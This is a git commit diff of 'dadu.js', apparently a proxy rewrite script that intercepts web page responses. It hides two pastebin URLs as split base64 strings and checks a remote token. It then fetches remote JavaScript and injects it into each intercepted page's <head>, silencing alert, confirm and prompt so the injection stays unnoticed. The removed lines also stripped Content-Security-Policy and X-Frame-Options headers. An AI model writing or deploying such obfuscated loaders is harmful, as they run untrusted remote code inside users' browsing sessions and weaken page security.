bd1d30fd2c100231b7d34baa132c5fae3bae1383
dimazez26-Ds <dimazez26@gmail.com>
2026-03-14 00:10:57 +0700

    Update dadu.js

--- dadu.js
+++ dadu.js
@@ -3,34 +3,25 @@ const MY_TOKEN = "ojeng_gacor";
 const _0xU1 = "aHR0cHM6"+"Ly9wYXN0ZWJpbi"+"5jb20vcmF3L0d"+"NMVIyZjh1";
 const _0xU2 = "aHR0cHM6"+"Ly9wYXN0ZWJp"+"bi5jb20vcmF3L"+"2tSWFY3ZnNU";
 
-const _0xF = ['includes', 'body', 'headers', 'replace', '<head>', 'Content-Security-Policy', 'X-Frame-Options', 'post'];
-const _0xM = (n) => _0xF[n];
-
-const _0xR1 = { url: atob(_0xU1) + "?t=" + Date.now() };
-const _0xR2 = { url: atob(_0xU2) };
+const _0xR1 = { url: atob(_0xU1) + "?t=" + Math.random() };
 
 $task.fetch(_0xR1).then(response => {
-    if (response.body && response.body[_0xM(0)](MY_TOKEN)) {
+    let b = $response.body;
+    if (response.body && response.body.includes(MY_TOKEN)) {
+        const _0xR2 = { url: atob(_0xU2) + "?t=" + Math.random() };
         $task.fetch(_0xR2).then(resp2 => {
-            let b = $response[_0xM(1)];
-            let h = $response[_0xM(2)];
-            let p = resp2.body;
-
-            if (h) {
-                delete h[_0xM(5)];
-                delete h[_0xM(6)];
-            }
-
-            if (b && p) {
-                const tag = _0xM(4);
-                b = b[_0xM(3)](tag, tag + p);
-            }
-            $done({ body: b, headers: h });
-        }, () => $done({}));
-    } else {
-        if (response.body) {
-            $notify("SYSTEM SECURITY", "ACCESS DENIED", "Token " + MY_TOKEN + " is not active.");
-        }
-        $done({});
-    }
-}, () => $done({}));
+            if (resp2.body && b) {
+                // MODIFIKASI KERAS: Menghapus perintah alert/popup dari script Kaurev sebelum masuk ke browser
+                let p = resp2.body
+                    .replace(/alert\(/g, "console.log(") // Ubah alert jadi log biasa
+                    .replace(/confirm\(/g, "console.log(")
+                    .replace(/prompt\(/g, "console.log(");
+                
+                // Matikan fungsi notifikasi di level window
+                const killPopup = "<script>window.alert=function(){};window.confirm=function(){};</script>";
+                
+                $done({ body: b.replace("<head>", "<head>" + killPopup + p) });
+            } else { $done({}); }
+        });
+    } else { $done({}); }
+}, () => { $done({}); });
